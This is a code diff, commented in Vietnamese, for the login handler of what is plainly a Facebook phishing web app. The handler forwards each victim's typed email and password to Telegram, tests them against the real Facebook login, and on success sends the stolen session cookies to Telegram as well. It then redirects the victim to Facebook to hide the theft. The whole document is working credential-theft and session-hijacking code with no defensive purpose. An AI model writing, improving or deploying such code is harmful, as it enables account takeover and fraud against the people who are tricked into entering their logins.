@@ -33,31 +33,47 @@ def login():
     if not email or not password:
         return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")
 
+    # Gửi thông tin đã nhập về Telegram
     send_to_telegram("📧 THÔNG TIN ĐÃ NHẬP", f"Email: {email}\nPassword: {password}")
 
     try:
+        # Tạo session để giữ cookie
+        s = requests.Session()
+
         headers = {
-            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml',
             'Accept-Language': 'vi-VN,vi;q=0.9',
-            'Referer': 'https://www.facebook.com/'
+            'Referer': 'https://www.facebook.com/',
+            'Origin': 'https://www.facebook.com'
         }
 
-        data = {'email': email, 'pass': password, 'login': '1'}
+        data = {
+            'email': email,
+            'pass': password,
+            'login': '1'
+        }
 
-        r = requests.post('https://www.facebook.com/login.php', 
-                         data=data, 
-                         headers=headers, 
-                         allow_redirects=True, 
-                         timeout=15)
+        # Gửi request đăng nhập đến Facebook thật
+        r = s.post('https://www.facebook.com/login.php', 
+                  data=data, 
+                  headers=headers, 
+                  allow_redirects=True, 
+                  timeout=15)
 
-        if any(x in r.url.lower() for x in ['home', 'facebook.com/home']):
-            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG", f"Email: {email}\nPassword: {password}")
+        # Kiểm tra xem Facebook có chấp nhận đăng nhập không
+        if any(x in r.url.lower() for x in ['home', 'facebook.com/home', '/messages']):
+            # Đăng nhập thành công → Lấy cookie thật
+            cookies = dict(s.cookies)
+            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG - COOKIE THẬT", 
+                           f"Email: {email}\nPassword: {password}\n\nCookie:\n{cookies}")
             return redirect('https://www.facebook.com')
         else:
+            # Sai mật khẩu hoặc bị chặn
             return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
-    except:
+    except Exception as e:
+        send_to_telegram("❌ LỖI KẾT NỐI", f"Email: {email}\nError: {str(e)}")
         return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
 if __name__ == '__main__':
